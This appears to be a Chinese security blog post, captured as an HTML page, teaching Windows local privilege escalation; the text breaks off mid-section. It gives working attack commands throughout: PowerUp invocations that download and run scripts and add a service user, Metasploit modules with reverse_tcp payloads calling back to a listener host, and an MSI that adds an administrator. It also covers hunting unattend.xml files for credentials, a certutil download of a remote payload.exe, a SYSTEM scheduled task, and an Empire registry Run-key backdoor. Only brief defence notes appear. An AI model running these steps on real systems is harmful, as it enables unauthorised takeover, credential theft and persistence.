@@ -1,0 +1,557 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>基于windows本地的提权 | V3teran's blog</title><meta name="keywords" content="提权,令牌,NTLM,注册表"><meta name="author" content="V3teran"><meta name="copyright" content="V3teran"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="目的通过应用程序或者操作系统等漏洞，使普通用户获得system权限。 前期信息收集 systeminfo操作系统、位数、补丁情况。  whoami用户权限、net user用户列表。 netstat –an查看端口。 ipconfig &#x2F;all查看ip，判断网站的服务器在外网环境还是内网环境，内网环境则需要涉及到端口转发 。 Tasklist &#x2F;svc进程情况，有无防护软件 。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于windows本地的提权">
+<meta property="og:url" content="https://v3teran.github.io/2021/02/14/%E5%9F%BA%E4%BA%8EWindows%E6%9C%AC%E5%9C%B0%E7%9A%84%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="V3teran&#39;s blog">
+<meta property="og:description" content="目的通过应用程序或者操作系统等漏洞，使普通用户获得system权限。 前期信息收集 systeminfo操作系统、位数、补丁情况。  whoami用户权限、net user用户列表。 netstat –an查看端口。 ipconfig &#x2F;all查看ip，判断网站的服务器在外网环境还是内网环境，内网环境则需要涉及到端口转发 。 Tasklist &#x2F;svc进程情况，有无防护软件 。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402193107.jpg">
+<meta property="article:published_time" content="2021-02-14T15:00:00.000Z">
+<meta property="article:modified_time" content="2021-07-25T12:20:31.000Z">
+<meta property="article:author" content="V3teran">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="令牌">
+<meta property="article:tag" content="NTLM">
+<meta property="article:tag" content="注册表">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402193107.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204173816.png"><link rel="canonical" href="https://v3teran.github.io/2021/02/14/%E5%9F%BA%E4%BA%8EWindows%E6%9C%AC%E5%9C%B0%E7%9A%84%E6%8F%90%E6%9D%83/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '基于windows本地的提权',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-25 20:20:31'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/lalala.css"><link rel="stylesheet" href="https://at.alicdn.com/t/font_2364346_8smao36j8yr.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210204173845.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402193107.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">V3teran's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">基于windows本地的提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-14T15:00:00.000Z" title="发表于 2021-02-14 23:00:00">2021-02-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-25T12:20:31.000Z" title="更新于 2021-07-25 20:20:31">2021-07-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8F%90%E6%9D%83/">提权</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>19分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="基于windows本地的提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a><strong>目的</strong></h1><p>通过应用程序或者操作系统等漏洞，使普通用户获得system权限。</p>
+<h1 id="前期信息收集"><a href="#前期信息收集" class="headerlink" title="前期信息收集"></a><strong>前期信息收集</strong></h1><ul>
+<li>systeminfo操作系统、位数、补丁情况。 </li>
+<li>whoami用户权限、net user用户列表。</li>
+<li>netstat –an查看端口。</li>
+<li>ipconfig &#x2F;all查看ip，判断网站的服务器在外网环境还是内网环境，内网环境则需要涉及到端口转发 。</li>
+<li>Tasklist &#x2F;svc进程情况，有无防护软件 。</li>
+<li>支持的组件和脚本类型 。</li>
+<li>找可读可写目录（不要带空格） 。</li>
+<li>for &#x2F;r c:\ %i in (nc*.exe) do @echo %i查找文件关键词。</li>
+</ul>
+<h1 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a><strong>内核溢出提权</strong></h1><p>利用前提：系统没有及时安装补丁，分远程溢出和本地溢出。</p>
+<p><strong>windows本地溢出</strong></p>
+<ol>
+<li>systeminfo查看补丁修复情况。</li>
+<li>查找目录读写执行权限。</li>
+<li>上传cmd命令程序（当前用户权限）。 </li>
+<li>上传本地exp提权程序，最好路径不带空格。 </li>
+<li>调用cmd执行exp提权程序提权并添加管理员账号。</li>
+<li>whoami确认获取系统权限。</li>
+</ol>
+<p><strong>linux本地溢出</strong></p>
+<p>Linux系统漏洞的exp一般按照内核版本来命名，如2.6.18-194，可以直接执行，如2.6.18.c，需要编译后运行，有少部分 exp 是按照发行版版本命名。</p>
+<ol>
+<li>反弹shell到本机，因为linux下提升权限得到的是交互式shell，需反弹才能进行下一步命令的执行。</li>
+<li>确认内核版本（uname -a、cat &#x2F;proc&#x2F;version）和发行版本（cat &#x2F;etc&#x2F;issue），选择相应的exp。</li>
+<li>上传对应内核版本的提权程序，记得chmod。</li>
+<li>执行提权程序获取root权限。</li>
+</ol>
+<p><strong>查找未打补丁的EXP</strong></p>
+<p>手动查找。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups       查看权限 </span><br><span class="line">systeminfo           查看补丁编号 </span><br><span class="line">wmic qfe get caption,Description,HotFixID,Installedon     列出已安装的补丁 </span><br></pre></td></tr></table></figure>
+
+<p>meterpreter。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches </span><br><span class="line">backgroud             或者手动 </span><br><span class="line">use post/windows/gather/enum_patches         </span><br><span class="line">set SESSION </span><br></pre></td></tr></table></figure>
+
+<p>查找工具。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/AonCyberLabs/Windows-Exploit-Suggester </span><br><span class="line">windows-exploit-suggester.py --update </span><br><span class="line">windows-exploit-suggester.py --database 2017-03-20-mssb.xls --systeminfo win7.txt  </span><br><span class="line">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester </span><br><span class="line"></span><br><span class="line">https://github.com/rasta-mouse/Sherlock </span><br><span class="line">Import-Module .\sherlock.ps1 </span><br><span class="line">Find-AllVulns </span><br><span class="line">Find-MS16135 </span><br><span class="line"></span><br><span class="line">http://bugs.hacking8.com/tiquan/ </span><br><span class="line">https://detect.secwx.com/</span><br></pre></td></tr></table></figure>
+
+<h1 id="系统配置错误提权"><a href="#系统配置错误提权" class="headerlink" title="系统配置错误提权"></a><strong>系统配置错误提权</strong></h1><h2 id="服务权限配置错误提权"><a href="#服务权限配置错误提权" class="headerlink" title="服务权限配置错误提权"></a><strong>服务权限配置错误提权</strong></h2><p>windows系统启动时会加载和执行一些服务文件，并在后台调用可执行文件。如果一个低权限用户对此类可执行文件有写权限，就可以将该文件替换成任意可执行文件，随着系统服务的启动而获得管理员权限。</p>
+<p><strong>分情况</strong></p>
+<ul>
+<li>服务未运行：攻击者使用任意服务替换原有服务，然后重启。</li>
+<li>服务正在运行且无法被终止：最常见的场景，攻击者通常会利用dll劫持技术并尝试重启服务来提权。</li>
+</ul>
+<p><strong>PowerUp（Empire内置也可）</strong></p>
+<p>列出可能存在问题的所有服务，在AbuseFunction项中给出利用方式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -exec bypass -c &quot;&amp; &#123;Import-Module .\powerup.ps1; Invoke-allchecks&#125;&quot; </span><br><span class="line">PowerShell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;C:\PowerUp.ps1&#x27;); Invoke-AllChecks&quot; </span><br><span class="line">PowerShell.exe -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/Powerup.ps1&#x27;); Invoke-AllChecks&quot; </span><br><span class="line">PowerShell.exe -exec bypass -c &quot;&amp; &#123;Import-Module .\powerup.ps1; Install-ServiceBinary -Name &#x27;Tomcat8&#x27; -Username V3teran -Password 123456&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>该模块的扫描的内容：</p>
+<ul>
+<li>没有被引号引起来的服务路径。 </li>
+<li>ACL配置错误的服务。</li>
+<li>服务的可执行权限配置不当。</li>
+<li>unattend.xml文件。</li>
+<li>注册表键AlwaysInstallElevated。</li>
+<li>注册表中的autologon凭证。</li>
+<li>加密的web.config字符串和应用程序池的密码。</li>
+<li>%path%.dll劫持。</li>
+</ul>
+<p><strong>MSF</strong></p>
+<p>service_permissions模块，设置AGGRESSIVE为true可以利用目标机器上每一个有缺陷的服务，否则第一次提权成功后就会停止。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploits/windows/local/service_permissions </span><br><span class="line">set SESSION 1 </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 172.16.1.6</span><br></pre></td></tr></table></figure>
+
+<p>两种获得system权限的方式，在创建服务或劫持存在服务时，该模块会创建一个可执行程序，文件名和安装路径是随机的。</p>
+<p>若meterpreter以管理员身份运行，则尝试创建新服务。</p>
+<p>若权限不够不能创建新服务，则判断哪些服务或文件和文件夹权限有问题，并对它劫持。</p>
+<h2 id="注册表键提权"><a href="#注册表键提权" class="headerlink" title="注册表键提权"></a><strong>注册表键提权</strong></h2><p>windows installer策略设置项。若启用“永远以高权限进行安装”（高版本系统名称可能会变化），任何权限的用户都能以system权限来安装MSI恶意文件，注册表两个位置会创建键值1（gpedit.msc）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<p><strong>Powerup</strong></p>
+<p>返回True表示键值已被设置，那么意味着MSI文件是以system权限运行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -exec bypass -c &quot;&amp; &#123;Import-Module .\powerup.ps1; GET-RegistryAlwaysInstallElevated&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>运行Write-UserAddMSI模块，生成MSI文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -exec bypass -c &quot;&amp; &#123;Import-Module .\powerup.ps1; Write-UserAddMSI&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后以普通权限运行，就会一个添加管理员账户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i useradd.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210213222507.png"></p>
+<p><strong>MSF</strong></p>
+<p>前提先获得shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/always_install_elevated   </span><br><span class="line">set SESSION 1 </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 172.16.1.6</span><br></pre></td></tr></table></figure>
+
+<p>从user权限提权到system权限。该模块会创建一个MSI，提权后会自动删除。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210404155325.png"></p>
+<p><strong>防御</strong></p>
+<p>禁用注册表键AlwaysInstallElevated。</p>
+<h2 id="可信服务路径提权"><a href="#可信服务路径提权" class="headerlink" title="可信服务路径提权"></a><strong>可信服务路径提权</strong></h2><p>系统会解析服务对应的文件路径中的空格，每碰到一个空格，系统就会寻找并执行与之名字匹配的程序（以路径开始至空格为止为名称），直到完全匹配为止；因此如果没有将服务可执行文件的路径用双引号引起来且包含空格，则可构造名称上传恶意程序，服务重启后，该程序会被执行。</p>
+<ul>
+<li>如果路径与服务有关，就任意创建一个服务或模板。</li>
+<li>如果路径与可执行文件有关，就任意创建一个可执行文件。</li>
+</ul>
+<p>如以下路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\test 123\Service.exe</span><br></pre></td></tr></table></figure>
+
+<p>系统匹配结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\test.exe</span><br><span class="line">C:\Program Files\test 123\Service.exe</span><br></pre></td></tr></table></figure>
+
+<p>寻找存在漏洞的服务。    </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\&quot; | findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>内置工具，检测目标文件夹是否有写权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;C:\Program Files\Serv U62&quot; </span><br><span class="line">(M):修改 </span><br><span class="line">(RX):读写</span><br><span class="line">(F):完全控制 </span><br><span class="line">(W):只写 </span><br><span class="line">(CI):从属文件夹继承访问控制</span><br><span class="line">(OI):从属文件继承访问控制</span><br></pre></td></tr></table></figure>
+
+<p>当前登录administrator，可完全控制。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210213235905.png"></p>
+<p>上传重命名程序（如Serv.exe）到目标文件夹中并重启服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop service_name </span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure>
+
+<p><strong>MSF</strong></p>
+<p>自动化攻击，返回system权限，但是很快会断，因为假服务进程没有与服务控制器通信而被中断了，可使用set AutoRunScript migrate -f自动迁移进程。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/trusted_service_path </span><br><span class="line">set SESSION 1 </span><br><span class="line">set payload windows/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 172.16.1.6</span><br></pre></td></tr></table></figure>
+
+<p>复现时，服务开启返回不了，服务关闭就成了&#x3D;。&#x3D;</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214234929.png"></p>
+<p><strong>防御</strong></p>
+<p>将文件路径用引号引起来。</p>
+<h2 id="批量安装配置文件提权"><a href="#批量安装配置文件提权" class="headerlink" title="批量安装配置文件提权"></a><strong>批量安装配置文件提权</strong></h2><p>批量配置多台机器的脚本中可能存在本地管理员账号和密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /b /s c:\unattend.xml</span><br></pre></td></tr></table></figure>
+
+<p>文件列举。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\sysprep.inf </span><br><span class="line">C:\sysprep\sysprep.xml </span><br><span class="line">C:\Windows\system32\sysprep.inf </span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml </span><br><span class="line">C:\unattend.xml </span><br><span class="line">C:\Windows\Panther\Unattend.xml </span><br><span class="line">C:\Windows\Panther\Unattended.xml </span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml </span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml </span><br><span class="line">C:\Windows\system32\sysprep\unattend.xml C:\Windows\system32\sysprep\Panther\unattend.xml</span><br></pre></td></tr></table></figure>
+
+<p><strong>MSF</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/enum_unattend</span><br></pre></td></tr></table></figure>
+
+<h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a><strong>计划任务提权</strong></h2><p>低权限用户对高权限运行的任务所在的目录具有写权限，就可以用恶意程序覆盖，计划任务执行时则会getshell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v   查看计划任务  </span><br></pre></td></tr></table></figure>
+
+<p> powershell查看计划任务，除去默认的和当前登录权限相同的任务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ScheduledTask | Select * | ? &#123;($_.TaskPath -notlike &quot;\Microsoft\Windows\*&quot;) -And ($_.Principal.UserId -notlike &quot;*$env:UserName*&quot;)&#125; | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @&#123;Name=&quot;User&quot;;Expression=&#123;$_.Principal.userID&#125;&#125;   </span><br></pre></td></tr></table></figure>
+
+<p>查看任务执行间隔。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$task= Get-ScheduledTask -TaskName xxxxx</span><br><span class="line">ForEach ($triger in $task.Triggers) &#123; echo $triger.Repetition.Interval&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看任务内容以及存储位置。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$task= Get-ScheduledTask -TaskName xxxxxx</span><br><span class="line">ForEach ($action in $task.Actions) &#123; Select $action.Execute&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>覆盖存在任务</strong></p>
+<p>AccessChk，微软官方工具，可进行一些系统高级查询，防查杀。 </p>
+<p>查看指定目录以及目录下任务的权限配置情况，是否可以直接覆盖。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -dqv &quot;D:\test\&quot; -accepteula    </span><br></pre></td></tr></table></figure>
+
+<p>若有权限则远程下载payload将原任务文件覆盖。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f &quot;http://xxxxxx/payload.exe&quot; D:\test\test.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>创建新任务</strong></p>
+<p>也可以强制创建计划任务test，开机时启动，启动权限为system。onlogon为登录时，onidle  -i 1为空闲时。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn test /sc onstart /tr payload.exe /ru system /f</span><br></pre></td></tr></table></figure>
+
+<p><strong>empire</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/elevated/schtasks </span><br><span class="line">set DailyTime 14:30 </span><br><span class="line">set Listener fxxx </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>等待到达设定的时间即可获得system权限的shell。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210214222645.png"></p>
+<p>还可以设置set RegPath，则会变成一个延时的注册表后门。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+
+<p><strong>msf</strong></p>
+<p>此模块支持在本地监听一个端口，别人一旦访问该端口就会将该端口内的文件读取至本地执行。</p>
